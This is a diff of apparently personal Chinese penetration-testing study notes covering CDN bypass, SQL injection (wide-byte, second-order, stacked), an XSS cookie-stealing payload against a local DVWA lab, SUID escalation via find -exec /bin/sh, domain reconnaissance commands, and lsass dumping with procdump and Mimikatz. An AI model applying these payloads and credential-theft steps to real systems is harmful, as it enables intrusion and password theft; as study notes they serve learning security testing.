@@ -13,9 +13,44 @@
 		若使用扫描网站目录工具扫描域名www.bolg.com，只可以扫描到博客网站这个目录下的内容；
 		如果扫描IP地址193.168.0.6，就可以扫描到list目录下的内容，即可以获取到其他项目的源码内容
 		总之，扫描IP可以比扫描域名的目录范围大一级。
-	
-	
-常见网络站点类型：
+
+##### CDN	
+
+#如何判断目标存在CDN服务？
+
+超级ping(站长工具ping检测)
+
+#目前常见的CDN绕过技术有哪些？
+子域名IP查询
+邮件服务查询
+国外地址请求
+遗留文件，扫描全网
+
+```
+一些站点在搭建之初，会用一些文件测试站点，例如“phpinfo ()”文件，此类文件里就有可能包含了真实的IP地址。 可以利用Google搜索引擎搜索关键字“site:xxx.com inurl:phpinfo.php”，搜索站点是否有遗留文件。
+```
+
+黑暗引擎搜索特定文件
+dns历史记 录，以量打量
+
+网站特征码hash
+
+```
+import mmh3
+import requests
+response=requests.get('http://www.xx.com/favicon.ico')
+favicon = response.content.encode('base64')
+hash =mmh3.hash(favicon)
+print 'http.favicon.hash:'+str(hash)	#shoda的搜索语法
+```
+
+#CDN真实IP地址获取后绑定指向地址
+更改本地HOSTS解析指向文件
+
+扫全网 
+fuckcdn(推荐), w8fuckcdn, zmap等
+
+网络站点类型：
 	1.目录型站点
 	2.端口型站点
 	3.子域名型站点
@@ -28,6 +63,12 @@
 	补天  src漏洞挖掘  挖到了有钱
 	ipip  可以选择地区ping，尝试绕过cdn,建议在南非这种贫困地区ping更容易获取最终IP地址，因为很少有公司会在这些地方专门建一个cdn结点
 	crt.sh 也可查子域名 证书
+
+SQL注入手工检测
+
+https://blog.csdn.net/zzkkoo8/article/details/78812566
+
+https://www.cnblogs.com/SCHAOGES/p/10889654.html
 
 2023.10.8
 	SQL注入
@@ -67,26 +108,31 @@
 		select * from user where name like '%xiaodi%'；用到SQL的模糊查询，%是通配符
 
 2023.11.08
-	宽字节注入 %DF' ->到php代码转义 -> %DF\' ->url就变成 %DF%5C%27 倘若网站是GBK数据库也用GBK，%DF%5C就是生僻字衰  ->到数据库就变成  衰' 此时引号成功注入sql语句中
-	SQL盲注
-		报错回显 https://bbs.huaweicloud.com/blogs/392084
-		延时盲注
-		布尔盲注	指页面只返回正确和错误两种结果，不回显任何信息；这时候可以注入and xxxx命令猜数据库的敏感信息，猜对页面则正常显示返回正确，猜错了则返回错误页面；如先猜数据库名字的长度？猜数据库名字第一位是？第二位是？
-		
+
+单引号'转义/'时可使用
+
+宽字节注入 %DF' ->到php代码转义 -> %DF\' ->url就变成 %DF%5C%27 倘若网站是GBK数据库也用GBK，%DF%5C就是生僻字衰  ->到数据库就变成  衰' 此时引号成功注入sql语句中
+
+​	SQL盲注
+​		报错回显 https://bbs.huaweicloud.com/blogs/392084
+​		延时盲注
+​		布尔盲注	指页面只返回正确和错误两种结果，不回显任何信息；这时候可以注入and xxxx命令猜数据库的敏感信息，猜对页面则正常显示返回正确，猜错了则返回错误页面；如先猜数据库名字的长度？猜数据库名字第一位是？第二位是？
+​		
 2023.11.18
-	二次注入：
-	目标：更改xiaomi的密码为88888888
-	注册页面注册 账号名为xiaomi'# 密码为1231321（随便填）
-	接着进入账号xiaomi'# 更改密码为88888888 此时后台的sql语句就变成 update password='88888888' where username='xiaomi' #' and password='1231321'
-	此时，橙色的语句就被注释掉了，即该语句把xiaomi的密码改了而xiaomi'#的密码不变
-	
+
+​	二次注入(单引号'转义/'时可使用，利用时要求取出数据时不转义)：
+​	目标：更改xiaomi的密码为88888888
+​	注册页面注册 账号名为xiaomi'# 密码为1231321（随便填）
+​	接着进入账号xiaomi'# 更改密码为88888888 此时后台的sql语句就变成 update password='88888888' where username='xiaomi' #' and password='1231321'
+​	此时，橙色的语句就被注释掉了，即该语句把xiaomi的密码改了而xiaomi'#的密码不变
+​	
 
 	堆叠注入：
 	就是利用;号写多个sql语句，有局限性，有些数据库支持执行多个语句，有些不行
 	
 	执行注释内的语句：
-	select version（）,/*!50554 now（）,*/user（）；若版本大于50554则会执行
-	select version（）,/*!now（）,*/user（）；如果省略版本号，则都会执行
+	select version（）,/*!50554 now（）,*/user（）;若版本大于50554则会执行
+	select version（）,/*!now（）,*/user（）;如果省略版本号，则都会执行
 
 ---------------------------
 	xss获取cookie，http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>
@@ -637,7 +683,7 @@ MySql：
 Win2012-烂土豆配合令牌窃取提权-Web权限
 Win2012-DLL劫持提权应用配合MSF-Web权限
 Win2012-不安全的服务权限配合MSF-本地权限
-Win2012-不带引|号服务路径配合MSF-Web,本地权限
+Win2012-不带引号服务路径配合MSF-Web,本地权限
 
 #### Linux提权
 
@@ -696,4 +742,61 @@ find xiaodi -exec "whoami" \;
 find xiaodi -exec "/bin/sh" \;
 id
 ```
+
+linux提权方法总结
+
+1.提权环境，信息收集（SUID，定时任务，可能漏洞，第三方服务应用等)
+2.最新相关漏洞要明确（关注点），二次开发相关脚本学会展望（四个脚本）
+3.本地searchsploit脚本(离线版)及远程exploitdbi站点搜索说明（简要使用https://www.exploit-db.com/）
+4.其他提权方法如：密码复用，guid，sudo等说明(运气，同理，鸡肋等)
+sudo说明参考：https://www.freebuf.com/vuls/217089.html
+
+常用的隧道技术有以下三种：
+网络层：IPv6 隧道、ICMP 隧道
+传输层：TCP 隧道、UDP 隧道、常规端口转发
+应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道
+
+#### 内网信息收集
+
+基本信息收集
+
+systeminfo	详细信息
+net start		启动服务
+tasklist		进程列表
+schtasks	计划任务
+
+网络信息收集
+
+ipconfig/all	判断存在域-dns
+net view /domain	判断存在域
+net time /domain	判断主域
+netstat -ano	当前网络端口开放
+nslookup	域名(win7.hack.com)	追踪来源地址
+
+用户信息收集
+
+系统默认常见身份：
+
+Domain Admins: 域管理员（默认对域控制器有完全控制权）
+Domain Computers: 域内机器
+Domain Controllers: 域控制器
+Domain Guest: 域访客，权限低
+Domain Users: 域用户
+Enterprise Admins: 企业系统管理员用户（默认对域控制器有完全控制权）
+
+whoami /all用户权限
+net config workstation登录信息
+net user本地用户
+net localgroup本地用户组
+net user /domain获取域用户信息
+net group /domain获取域用户组信息
+wmic useraccount get /all涉及域用户详细信息
+net group "Domain Admins" /domain查询域管理员账户
+net group "Enterprise Admins" /domain查询管理员用户组
+
+net group "Domain Controllers" /domain 查询域控制器
+
+获取电脑密码
+
+在靶机运行procdump.exe(这是微软官方的)生成lsass.dmp，再把这个文件拉到自己的电脑上配合Mimikatz破解出密码，若Mimikatz直接在靶机运行可能会被杀
 
